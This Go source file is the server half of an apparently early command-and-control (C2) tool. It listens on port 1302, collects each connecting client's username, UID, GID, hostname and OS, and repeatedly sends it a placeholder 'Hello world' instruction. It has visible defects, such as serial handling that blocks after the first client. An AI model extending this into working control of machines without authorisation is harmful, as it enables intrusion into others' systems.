package cmd

import (
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/spf13/viper"
)

type Client struct {
	Username        string
	UID             string
	GID             string
	OperatingSystem string
	Hostname        string
	Conn            net.Conn
}

type Instructions struct {
	Message string
}

var (
	C2Port     string = "1302"
	clientList []*Client
)

func (c Client) Instruct(i Instructions) error {
	enc := gob.NewEncoder(c.Conn)
	err := enc.Encode(i)
	if err != nil {
		return err
	}
	return nil
}

func Server() {
	p := viper.GetString("Server.Port")
	if p != "" {
		C2Port = p
	}
	go WebServer()

	ln, err := net.Listen("tcp", ":"+C2Port)
	if err != nil {
		log.Fatalf("Error happened listening on C2 port: %v\n", err)
	}
	log.Printf("Listening on port %v...", C2Port)
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error happened accepting connection: %v\n", err)
		}
		handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	client, err := getOS(conn)
	if err != nil {
		log.Printf("Error happened receiving OS information: %v\n", err)
	}
	client.Conn = conn
	fmt.Printf("Got info from new user:\nUsername: %v\nUID: %v\nGID: %v\nHostname: %v\nOS: %v\n", client.Username,
		client.UID, client.GID, client.Hostname, client.OperatingSystem)
	time.Sleep(time.Second * 7)
	fmt.Println("7 seconds have passed, sending message!")
	time.Sleep(time.Millisecond * 500)
	newMessage := Instructions{
		Message: "Hello world",
	}
	for {
		time.Sleep(time.Second)
		client.Instruct(newMessage)
	}

	// for i, v := range clientList {
	// 	fmt.Println(i, v)
	//
	// }
}

func getOS(conn net.Conn) (*Client, error) {
	dec := gob.NewDecoder(conn)
	c := new(Client)
	err := dec.Decode(&c)
	if err != nil {
		bad := Client{}
		return &bad, err
	}
	clientList = append(clientList, c)
	return c, nil
}
